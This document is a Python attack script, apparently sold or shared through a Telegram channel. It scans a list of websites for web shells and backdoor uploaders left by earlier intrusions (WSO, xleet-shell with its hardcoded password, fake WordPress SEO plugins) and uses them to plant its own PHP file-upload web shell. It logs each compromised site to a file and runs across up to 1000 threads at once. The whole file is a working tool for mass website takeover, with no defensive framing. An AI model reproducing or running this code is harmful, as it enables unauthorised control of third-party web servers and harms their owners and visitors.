import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
#Coded By: RxR HaCkEr
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
           
https://t.me/x7seller   

\n'''.format(fr)
print banner
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')




 
class MyEvaiLCode:
	def __init__(self):
		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}
		self.shell_content = """<?php echo "<title>Uploader RxR HaCkEr</title><b>RxR HaCkEr :===>>> Telegram: https://t.me/x7seller </b></br>".$_SERVER['DOCUMENT_ROOT']."</br>".php_uname();   $cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ;?>"""
		

	def ran(self, length):
		letters = string.ascii_lowercase
		return ''.join(random.choice(letters) for i in range(length))
		

	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
	
	

	def WsoRandom(self, url):
		try:
			filename = "RxR" + self.ran(8) + ".php"
			url = 'http://' + self.URLdomain(url)
			check = requests.get(url+'/wso112233.php',headers=self.headers, allow_redirects=True,timeout=15)
			if 'Uname:' in check.content:
					headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36','Content-Type':'multipart/form-data; boundary=---------------------------293594749327915611002775547600'}

					
					print("Target:{} {}[Vulnerability]").format(url,fg)
					
					data = '-----------------------------293594749327915611002775547600\r\n'
					data += 'Content-Disposition: form-data; name="a"\r\n'
					data += '\r\n'
					data += 'FilesMAn\r\n'
					data += '-----------------------------293594749327915611002775547600\r\n'
					data += 'Content-Disposition: form-data; name="c"\r\n'
					data += '\r\n'
					data += '\r\n'
					data += '-----------------------------293594749327915611002775547600\r\n'
					data += 'Content-Disposition: form-data; name="p1"\r\n'
					data += '\r\n'
					data += 'uploadFile\r\n'
					data += '-----------------------------293594749327915611002775547600\r\n'
					data += 'Content-Disposition: form-data; name="charset"\r\n'
					data += '\r\n'
					data += 'Windows-1251\r\n'
					data += '-----------------------------293594749327915611002775547600\r\n'
					data += 'Content-Disposition: form-data; name="f"; filename="{}"\r\n'.format(filename)
					data += 'Content-Type: application/octet-stream\r\n'
					data += '\r\n'
					data += '{}\r\n'.format(self.shell_content)
					data += '-----------------------------293594749327915611002775547600--\r\n'
					
					Upload = requests.post(url + '/wso112233.php', data=data, headers=headersup).content
					
					Check_Shell = requests.get(url + '/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
					if('Uploader RxR HaCkEr' in Check_Shell):
						print("Target:{} {} [Succefully Uploading]").format(url + "/" + filename,fg)
						open('SuccessUp.txt','a').write(url + "/" + filename + "\n")
					else:
						print("Target:{} {} [Failed Upload]").format(url,fr)

			else:
				url = 'http://' + self.URLdomain(url)
				check = requests.get(url+'/wp-includes/wp-class.php',headers=self.headers, allow_redirects=True,verify=False ,timeout=15)
				if 'Uname:' in check.content:
						print("Target:{} {}[Vulnerability]").format(url,fg)
						headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
									'Content-Type':'multipart/form-data; boundary=---------------------------148105767315834444892804928051'}

						
						data = '-----------------------------148105767315834444892804928051\r\n'
						data += 'Content-Disposition: form-data; name="a"\r\n'
						data += '\r\n'
						data += 'FilesMan\r\n'
						data += '-----------------------------148105767315834444892804928051\r\n'
						data += 'Content-Disposition: form-data; name="c"\r\n'
						data += '\r\n'
						data += '/nas/content/live/nostest/wp-includes/\r\n'
						data += '-----------------------------148105767315834444892804928051\r\n'
						data += 'Content-Disposition: form-data; name="p1"\r\n'
						data += '\r\n'
						data += 'uploadFile\r\n'
						data += '-----------------------------148105767315834444892804928051\r\n'
						data += 'Content-Disposition: form-data; name="ne"\r\n'
						data += '\r\n'
						data += '\r\n'
						data += '-----------------------------148105767315834444892804928051\r\n'
						data += 'Content-Disposition: form-data; name="charset"\r\n'
						data += '\r\n'
						data += 'UTF-8\r\n'
						data += '-----------------------------148105767315834444892804928051\r\n'
						data += 'Content-Disposition: form-data; name="f[]"; filename="{}"\r\n'.format(filename)
						data += 'Content-Type: text/plain\r\n'
						data += '\r\n'
						data += '{}\r\n'.format(self.shell_content)
						data += '-----------------------------148105767315834444892804928051--\r\n'
						
						Upload = requests.post(url + '/wp-includes/wp-class.php', data=data, headers=headersup).content
						
						Check_Shell = requests.get(url + '/wp-includes/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
						if('Uploader RxR HaCkEr' in Check_Shell):
							print("Target:{} {}[Succefully Uploading]").format(url + '/wp-includes/' + filename,fg)
							open('SuccessUp.txt','a').write(url + '/wp-includes/' + filename + "\n")
						else:
							print("Target:{} {} [Failed Upload]").format(url,fr)
				else:
					print('Target:{} {}[Not Vulnerability]').format(url,fr)

					check = requests.get(url+'/wp-content/shell20211028.php',headers=self.headers, allow_redirects=True,timeout=15)
					
					if 'Uname:' in check.content:
							print("Target:{} {}[Vulnerability]").format(url,fg)
							headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36','Content-Type':'multipart/form-data; boundary=---------------------------293594749327915611002775547600'}
							
							data = '-----------------------------293594749327915611002775547600\r\n'
							data += 'Content-Disposition: form-data; name="a"\r\n'
							data += '\r\n'
							data += 'FilesMAn\r\n'
							data += '-----------------------------293594749327915611002775547600\r\n'
							data += 'Content-Disposition: form-data; name="c"\r\n'
							data += '\r\n'
							data += '\r\n'
							data += '-----------------------------293594749327915611002775547600\r\n'
							data += 'Content-Disposition: form-data; name="p1"\r\n'
							data += '\r\n'
							data += 'uploadFile\r\n'
							data += '-----------------------------293594749327915611002775547600\r\n'
							data += 'Content-Disposition: form-data; name="charset"\r\n'
							data += '\r\n'
							data += 'Windows-1251\r\n'
							data += '-----------------------------293594749327915611002775547600\r\n'
							data += 'Content-Disposition: form-data; name="f"; filename="{}"\r\n'.format(filename)
							data += 'Content-Type: application/octet-stream\r\n'
							data += '\r\n'
							data += '{}\r\n'.format(self.shell_content)
							data += '-----------------------------293594749327915611002775547600--\r\n'
							
							Upload = requests.post(url + '/wp-content/shell20211028.php', data=data, headers=headersup).content
							
							Check_Shell = requests.get(url + '/wp-content/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
							if('Uploader RxR HaCkEr' in Check_Shell):
								print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/' + filename,fg)
								open('SuccessUp.txt','a').write(url + '/wp-content/' + filename + "\n")
							else:
								print("Target:{} {} [Failed Upload]").format(url,fr)
					else:
						url = 'http://' + self.URLdomain(url)
						check = requests.get(url + '/xleet-shell.php',headers=self.headers, allow_redirects=True,verify=False ,timeout=15)
						if 'pre align=center><form method=post>Password<br><input type=password name=pass' in check.content:
							print("Target:{} {}[Vulnerability]").format(url,fg)
							
							data = {"pass":"xleet","watching":"submit"}
							Login_xleet = requests.post(url + '/xleet-shell.php', data=data, headers=self.headers,verify=False ,timeout=15)
							if('Uname:' in Login_xleet.content):
								headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
										'Content-Type':'multipart/form-data; boundary=---------------------------148105767315834444892804928051'}

							
								data = '-----------------------------148105767315834444892804928051\r\n'
								data += 'Content-Disposition: form-data; name="a"\r\n'
								data += '\r\n'
								data += 'FilesMan\r\n'
								data += '-----------------------------148105767315834444892804928051\r\n'
								data += 'Content-Disposition: form-data; name="c"\r\n'
								data += '\r\n'
								data += '/nas/content/live/nostest/wp-includes/\r\n'
								data += '-----------------------------148105767315834444892804928051\r\n'
								data += 'Content-Disposition: form-data; name="p1"\r\n'
								data += '\r\n'
								data += 'uploadFile\r\n'
								data += '-----------------------------148105767315834444892804928051\r\n'
								data += 'Content-Disposition: form-data; name="ne"\r\n'
								data += '\r\n'
								data += '\r\n'
								data += '-----------------------------148105767315834444892804928051\r\n'
								data += 'Content-Disposition: form-data; name="charset"\r\n'
								data += '\r\n'
								data += 'UTF-8\r\n'
								data += '-----------------------------148105767315834444892804928051\r\n'
								data += 'Content-Disposition: form-data; name="f[]"; filename="{}"\r\n'.format(filename)
								data += 'Content-Type: application/octet-stream\r\n'
								data += '\r\n'
								data += '{}\r\n'.format(self.shell_content)
								data += '-----------------------------148105767315834444892804928051--\r\n'
								Upload = requests.post(url + '/xleet-shell.php', data=data, cookies=Login_xleet.cookies,headers=headersup).content
								
								Check_Shell = requests.get(url + '/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
								if('Uploader RxR HaCkEr' in Check_Shell):
									print("Target:{} {}[Succefully Uploading]").format(url + "/" + filename,fg)
									open('SuccessUp.txt','a').write(url + '/' + filename + "\n")
								else:
									print("Target:{} {} [Failed Upload]").format(url,fr)

		except :
			print('Target:{} {}[Domain Dead]').format(url,fr)

	
	
	
	def Random_plugins(self, url):
		try:
			filename = "RxR" + self.ran(8) + ".php"
			url = 'http://' + self.URLdomain(url)
			check = requests.get(url+'/wp-content/themes/seotheme/db.php?u',headers=self.headers, allow_redirects=True,timeout=15)
			if 'enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="30"><input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
					print("Target:{} {}[Vulnerability]").format(url,fg)
					headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
									 'Content-Type':'multipart/form-data; boundary=---------------------------12506695537580437361896332570'}
					#open('Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/db.php?u\n')
					data = '-----------------------------12506695537580437361896332570\r\n'
					data += 'Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(filename)
					data += 'Content-Type: text/plain\r\n'
					data += '\r\n'
					data += '{}\r\n'.format(self.shell_content)
					data += '-----------------------------12506695537580437361896332570\r\n'
					data += 'Content-Disposition: form-data; name="_upl"\r\n'
					data += '\r\n'
					data += 'Upload\r\n'
					data += '-----------------------------12506695537580437361896332570--\r\n'
					Upload = requests.post(url + '/wp-content/themes/seotheme/db.php?u', data=data, headers=headersup).content
						
					Check_Shell = requests.get(url + '/wp-content/themes/seotheme/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
					if('Uploader RxR HaCkEr' in Check_Shell):
						print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/themes/seotheme/' + filename,fg)
						open('Successup.txt','a').write(url + '/wp-content/themes/seotheme/' + filename + "\n")
					else:
						print("Target:{} {} [Failed Upload]").format(url,fr)
			else:
				url = 'https://' + URLdomain(url)
				check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=self.headers, allow_redirects=True,verify=False ,timeout=15)
				if 'enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="30"><input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
					print("Target:{} {}[Vulnerability]").format(url,fg)
					headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
										 'Content-Type':'multipart/form-data; boundary=---------------------------12506695537580437361896332570'}
						#open('Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/db.php?u\n')
					data = '-----------------------------12506695537580437361896332570\r\n'
					data += 'Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(filename)
					data += 'Content-Type: text/plain\r\n'
					data += '\r\n'
					data += '{}\r\n'.format(self.shell_content)
					data += '-----------------------------12506695537580437361896332570\r\n'
					data += 'Content-Disposition: form-data; name="_upl"\r\n'
					data += '\r\n'
					data += 'Upload\r\n'
					data += '-----------------------------12506695537580437361896332570--\r\n'
					Upload = requests.post(url + '/wp-content/plugins/seoplugins/db.php?u', data=data, headers=headersup).content
							
					Check_Shell = requests.get(url + '/wp-content/plugins/seoplugins/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
					if('Uploader RxR HaCkEr' in Check_Shell):
						print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/plugins/seoplugins/' + filename)
						open('Successup.txt','a').write(url + '/wp-content/plugins/seoplugins/' + filename + "\n")
					else:
						print("Target:{} {} [Failed Upload]").format(url,fr)
						# open('Shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
				else:
					print('Target:{} {}[Not Vulnerability]').format(url,fr)
					url = 'http://' + self.URLdomain(url)
			check = requests.get(url+'/wp-content/plugins/linkpreview/db.php?u',headers=self.headers, allow_redirects=True,timeout=15)
			if 'enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="30"><input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
				print("Target:{} {}[Vulnerability]").format(url,fg)
				headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
										 'Content-Type':'multipart/form-data; boundary=---------------------------12506695537580437361896332570'}
					#open('Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/db.php?u\n')
				data = '-----------------------------12506695537580437361896332570\r\n'
				data += 'Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(filename)
				data += 'Content-Type: text/plain\r\n'
				data += '\r\n'
				data += '{}\r\n'.format(self.shell_content)
				data += '-----------------------------12506695537580437361896332570\r\n'
				data += 'Content-Disposition: form-data; name="_upl"\r\n'
				data += '\r\n'
				data += 'Upload\r\n'
				data += '-----------------------------12506695537580437361896332570--\r\n'
				Upload = requests.post(url + '/wp-content/plugins/linkpreview/db.php?u', data=data, headers=headersup).content
							
				Check_Shell = requests.get(url + '/wp-content/plugins/linkpreview/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
				if('Uploader RxR HaCkEr' in Check_Shell):
					print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/plugins/linkpreview/' + filename,fg)
					open('Successup.txt','a').write(url + '/wp-content/plugins/linkpreview/' + filename + "\n")
				else:
					print("Target:{} {} [Failed Upload]").format(url,fr)
			else:
				url = 'https://' + URLdomain(url)
			check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=self.headers, allow_redirects=True,timeout=15)
			if 'enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="30"><input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
				print("Target:{} {}[Vulnerability]").format(url,fg)
				headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
										 'Content-Type':'multipart/form-data; boundary=---------------------------12506695537580437361896332570'}
					#open('Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/db.php?u\n')
				data = '-----------------------------12506695537580437361896332570\r\n'
				data += 'Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(filename)
				data += 'Content-Type: text/plain\r\n'
				data += '\r\n'
				data += '{}\r\n'.format(self.shell_content)
				data += '-----------------------------12506695537580437361896332570\r\n'
				data += 'Content-Disposition: form-data; name="_upl"\r\n'
				data += '\r\n'
				data += 'Upload\r\n'
				data += '-----------------------------12506695537580437361896332570--\r\n'
				Upload = requests.post(url + '/wp-content/themes/pridmag/db.php?u', data=data, headers=headersup).content
							
				Check_Shell = requests.get(url + '/wp-content/themes/pridmag/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
				if('Uploader RxR HaCkEr' in Check_Shell):
					print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/themes/pridmag/' + filename,fg)
					open('Successup.txt','a').write(url + '/wp-content/themes/pridmag/' + filename + "\n")
				else:
					print("Target:{} {} [Failed Upload]").format(url,fr)
			else:
				url = 'https://' + URLdomain(url)
			check = requests.get(url+'/wp-content/plugins/xwp/up.php',headers=self.headers, allow_redirects=True,timeout=15)
			if 'input type="file" name="a"><input name="x" type="submit" value="x"' in check.content:
			
				print("Target:{} {}[Vulnerability]").format(url,fg)
				headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
										 'Content-Type':'multipart/form-data; boundary=---------------------------28844570734231014052285756257'}
				data = '-----------------------------28844570734231014052285756257\r\n'
				data += 'Content-Disposition: form-data; name="a"; filename="{}"\r\n'.format(filename)
				data += 'Content-Type: text/plain\r\n'
				data += '\r\n'
				data += '{}\r\n'.format(self.shell_content)
				data += '-----------------------------28844570734231014052285756257\r\n'
				data += 'Content-Disposition: form-data; name="x"\r\n'
				data += '\r\n'
				data += 'x\r\n'
				data += '-----------------------------28844570734231014052285756257--\r\n'
				
				Upload = requests.post(url + '/wp-content/plugins/xwp/up.php', data=data, headers=headersup).content
							
				Check_Shell = requests.get(url + '/wp-content/plugins/xwp/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
				if('Uploader RxR HaCkEr' in Check_Shell):
					print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/plugins/xwp/' + filename,fg)
					open('Successup.txt','a').write(url + '/wp-content/themes/pridmag/' + filename + "\n")
				else:
					print("Target:{} {} [Failed Upload]").format(url,fr)
				   
			else:
					print('Target:{} {}[Not Vulnerability]').format(url,fr)
					url = 'http://' + self.URLdomain(url)
			check = requests.get(url+'/wp-content/plugins/wordpresss3cll/up.php',headers=self.headers, allow_redirects=True,timeout=15)
			if 'enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<' in check.content:
				print("Target:{} {}[Vulnerability]").format(url,fg)
				headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
													 'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
				data = '-----------------------------212444829518202317592639615915\r\n'
				data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(filename)
				data += 'Content-Type: text/plain\r\n'
				data += '\r\n'
				data += '{}\r\n'.format(self.shell_content)
				data += '-----------------------------212444829518202317592639615915--\r\n'
				
				Upload = requests.post(url + '/wp-content/plugins/wordpresss3cll/up.php', data=data, headers=headersup).content
							
				Check_Shell = requests.get(url + '/wp-content/plugins/wordpresss3cll/' + filename  ,headers=self.headers, allow_redirects=True,timeout=15).content
				if('Uploader RxR HaCkEr' in Check_Shell):
					print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/plugins/wordpresss3cll/' + filename,fg)
					open('Successup.txt','a').write(url + '/wp-content/plugins/wordpresss3cll/' + filename + "\n")
				else:
					print("Target:{} {} [Failed Upload]").format(url,fr)
			else:
				print('Target:{} {}[Not Vulnerability]').format(url,fr)
				url = 'https://' + URLdomain(url)
			check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=self.headers, allow_redirects=True,verify=False ,timeout=15)
			if 'input name="userfile" type="file"><input type="submit" value="Upload"' in check.content:
				print("Target:{} {}[Vulnerability]").format(url,fg)
				Path_pulic = re.findall('name="l" value="(.*?)" style="',check.content)[0]
				headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
													 'Content-Type':'multipart/form-data; boundary=---------------------------5172870323164032873359930785'}
				data = '-----------------------------5172870323164032873359930785\r\n'
				data += 'Content-Disposition: form-data; name="l"\r\n'
				data += '\r\n'
				data += '{}\r\n'.format(Path_pulic)
				data += '-----------------------------5172870323164032873359930785\r\n'
				data += 'Content-Disposition: form-data; name="userfile"; filename="{}"\r\n'.format(filename)
				data += 'Content-Type: text/plain\r\n'
				data += '\r\n'
				data += '{}\r\n'.format(self.shell_content)
				data += '-----------------------------5172870323164032873359930785--\r\n'
				Upload = requests.post(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk', data=data, headers=headersup).content
							
				Check_Shell = requests.get(url + '/wp-content/plugins/ioptimization/' + filename  ,headers=self.headers, allow_redirects=True,timeout=15).content
				if('Uploader RxR HaCkEr' in Check_Shell):
					print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/plugins/ioptimization/' + filename,fg)
					open('Successup.txt','a').write(url + '/wp-content/plugins/ioptimization/' + filename + "\n")
				else:
					print("Target:{} {} [Failed Upload]").format(url,fr)
			else:
				url = 'https://' + URLdomain(url)
				check = requests.get(url+'/edit.php',headers=self.headers, allow_redirects=True,verify=False ,timeout=15)
				if 'Green Shell' in check.content:
					print("Target:{} {}[Vulnerability]").format(url,fg)
					headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
													 'Content-Type':'multipart/form-data; boundary=---------------------------383187635215907458071299581331'}
					data = '-----------------------------383187635215907458071299581331\r\n'
					data += 'Content-Disposition: form-data; name="a"\r\n'
					data += '\r\n'
					data += 'FilesMAn\r\n'
					data += '-----------------------------383187635215907458071299581331\r\n'
					data += 'Content-Disposition: form-data; name="c"\r\n'
					data += '\r\n'
					data += '\r\n'
					data += '-----------------------------383187635215907458071299581331\r\n'
					data += 'Content-Disposition: form-data; name="p1"\r\n'
					data += '\r\n'
					data += 'uploadFile\r\n'
					data += '-----------------------------383187635215907458071299581331\r\n'
					data += 'Content-Disposition: form-data; name="charset"\r\n'
					data += '\r\n'
					data += 'UTF-8\r\n'
					data += '-----------------------------383187635215907458071299581331\r\n'
					data += 'Content-Disposition: form-data; name="f"; filename="{}"\r\n'.format(filename)
					data += 'Content-Type: text/plain\r\n'
					data += '\r\n'
					data += '{}\r\n'.format(self.shell_content)
					data += '-----------------------------383187635215907458071299581331--\r\n'
					
					Upload = requests.post(url + '/edit.php', data=data, headers=headersup).content
							
					Check_Shell = requests.get(url + '/' + filename  ,headers=self.headers, allow_redirects=True,timeout=15).content
					if('Uploader RxR HaCkEr' in Check_Shell):
						print("Target:{} {}[Succefully Uploading]").format(url + '/' + filename,fg)
						open('Successup.txt','a').write(url + '/' + filename + "\n")
					else:
						print("Target:{} {} [Failed Upload]").format(url,fr)
				else:
					print('Target:{} {}[Not Vulnerability]').format(url,fr)
		except :
			print('Target:{} {}[Domain Dead]').format(url,fr)
			
			
			
	def Random_new(self, url):
		try:
			url = 'http://' + self.URLdomain(url)
			filename = "RxR" + self.ran(8) + ".php"
			check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=self.headers, allow_redirects=True,timeout=15)
			if 'Negat1ve Shell' in check.content:
				headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
							 'Content-Type':'multipart/form-data; boundary=---------------------------797575287704659169831762525'}
				print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
				data = '-----------------------------797575287704659169831762525\r\n'
				data += 'Content-Disposition: form-data; name="uploadfile[]"; filename="{}"\r\n'.format(filename)
				data += 'Content-Type: application/octet-stream\r\n'
				data += '\r\n'
				data += '{}\r\n'.format(self.shell_content)
				data += '-----------------------------797575287704659169831762525--\r\n'
				Upload = requests.post(url + '/wp-content/plugins/ccx/index.php', data=data, headers=headersup).content
						
				Check_Shell = requests.get(url + '/wp-content/plugins/ccx/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
				if('Uploader RxR HaCkEr' in Check_Shell):
					print("Target:{} {}[Succefully Uploading]").format(url + '/wp-content/plugins/ccx/' + filename,fg)
					open('Successup.txt','a').write(url + '/wp-content/plugins/ccx/' + filename + "\n")
				else:
					print("Target:{} {} [Failed Upload]").format(url,fr)
			else:
				url = 'https://' + URLdomain(url)
				check = requests.get(url+'/ccx/index.php',headers=self.headers, allow_redirects=True,verify=False ,timeout=15)
				if 'Negat1ve Shell' in check.content:
					headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
									'Content-Type':'multipart/form-data; boundary=---------------------------797575287704659169831762525'}
					print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
					data = '-----------------------------797575287704659169831762525\r\n'
					data += 'Content-Disposition: form-data; name="uploadfile[]"; filename="{}"\r\n'.format(filename)
					data += 'Content-Type: application/octet-stream\r\n'
					data += '\r\n'
					data += '{}\r\n'.format(self.shell_content)
					data += '-----------------------------797575287704659169831762525--\r\n'
					Upload = requests.post(url + '/ccx/index.php', data=data, headers=headersup).content
							
					Check_Shell = requests.get(url + '/ccx/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content
					if('Uploader RxR HaCkEr' in Check_Shell):
						print("Target:{} {}[Succefully Uploading]").format(url + '/ccx/' + filename,fg)
						open('Successup.txt','a').write(url + '/ccx/' + filename + "\n")
					else:
						print("Target:{} {} [Failed Upload]").format(url,fr)
						
		except:
			print('Target:{} {}[Domain Dead]').format(url,fr)
	
See = MyEvaiLCode()	
def RunMyCode(site):
	try:
		See.WsoRandom(site)
		See.Random_plugins(site)
		See.Random_new(site)
	except:
		pass
#RunMyCode("https://retwisdom.wpengine.com/")
mp = Pool(1000)
mp.map(RunMyCode, target)
mp.close()
mp.join()
